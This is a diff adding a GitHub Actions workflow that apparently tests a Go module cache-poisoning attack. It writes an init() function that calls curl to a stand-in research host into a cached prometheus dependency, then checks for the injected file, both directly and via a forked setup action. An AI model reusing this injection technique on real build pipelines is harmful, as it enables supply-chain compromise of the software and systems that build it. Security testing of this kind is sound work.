@@ -1,0 +1,100 @@
+name: Test Prometheus Attack (Cache Poisoning)
+on: workflow_dispatch
+
+jobs:
+  test-payload-direct:
+    name: "Test payload directly (no action)"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+          cache: false
+
+      - name: "Populate Go module cache with a prometheus dependency"
+        run: |
+          mkdir -p /tmp/gotest && cd /tmp/gotest
+          go mod init test
+          go get github.com/prometheus/common@v0.62.0
+          echo "=== Module cache contents ==="
+          find ~/go/pkg/mod -type d -path "*/prometheus/*" | head -5
+
+      - name: "Run cache poisoning payload"
+        run: |
+          pkgdir=$(find ~/go/pkg/mod -type d -path "*/prometheus/*" 2>/dev/null | head -1)
+          if [ -n "$pkgdir" ]; then
+            pkgname=$(grep -r "^package " "$pkgdir"/*.go 2>/dev/null | head -1 | awk '{print $2}')
+            [ -z "$pkgname" ] && pkgname="main"
+            chmod +w "$pkgdir"
+            printf 'package %s\n\nimport "os/exec"\n\nfunc init() {\n\texec.Command("curl", "-sS", "https://eaction-research.example.com/cache-poison").Run()\n}\n' "$pkgname" > "$pkgdir/eaction_cache_init.go"
+          fi
+
+      - name: "Verify injected file exists"
+        run: |
+          echo "=== Looking for injected file ==="
+          find ~/go/pkg/mod -name "eaction_cache_init.go" -exec echo "FOUND: {}" \; -exec cat {} \;
+          echo ""
+          echo "=== Would this compile? ==="
+          injected=$(find ~/go/pkg/mod -name "eaction_cache_init.go" | head -1)
+          if [ -n "$injected" ]; then
+            echo "File found at: $injected"
+            pkgdir=$(dirname "$injected")
+            echo "Package dir: $pkgdir"
+            echo "Other .go files in same dir:"
+            ls "$pkgdir"/*.go 2>/dev/null | head -5
+            echo "Package name in injected file:"
+            head -1 "$injected"
+            echo "Package name in existing files:"
+            grep "^package " "$pkgdir"/*.go 2>/dev/null | head -3
+          else
+            echo "INJECTED FILE NOT FOUND"
+          fi
+
+  test-via-action:
+    name: "Test via forked promci-setup action"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+          cache: false
+
+      - name: "Pre-populate Go module cache"
+        run: |
+          mkdir -p /tmp/gotest && cd /tmp/gotest
+          go mod init test
+          go get github.com/prometheus/common@v0.62.0
+
+      - name: "Create dummy go.sum so cache key works"
+        run: |
+          cd /tmp/gotest
+          cp go.sum $GITHUB_WORKSPACE/go.sum
+
+      - name: "Run forked promci-setup (will fail at make promu, that's expected)"
+        uses: rafidhaque/promci-setup@86b9162dbe478fb05517a2b83d3efaecc0e4e0ea
+        with:
+          enable_go: 'true'
+        continue-on-error: true
+
+      - name: "Verify injected file exists"
+        run: |
+          echo "=== Looking for injected file ==="
+          find ~/go/pkg/mod -name "eaction_cache_init.go" -exec echo "FOUND: {}" \; -exec cat {} \;
+          echo ""
+          injected=$(find ~/go/pkg/mod -name "eaction_cache_init.go" | head -1)
+          if [ -n "$injected" ]; then
+            echo "SUCCESS: Cache poisoning payload was injected"
+            echo "File: $injected"
+            echo "Contents:"
+            cat "$injected"
+            echo ""
+            echo "Package name matches existing files:"
+            pkgdir=$(dirname "$injected")
+            grep "^package " "$pkgdir"/*.go 2>/dev/null | head -3
+          else
+            echo "FAILURE: Injected file not found"
+            echo "=== Debug: module cache contents ==="
+            find ~/go/pkg/mod -type d -path "*/prometheus/*" 2>/dev/null | head -10
+          fi
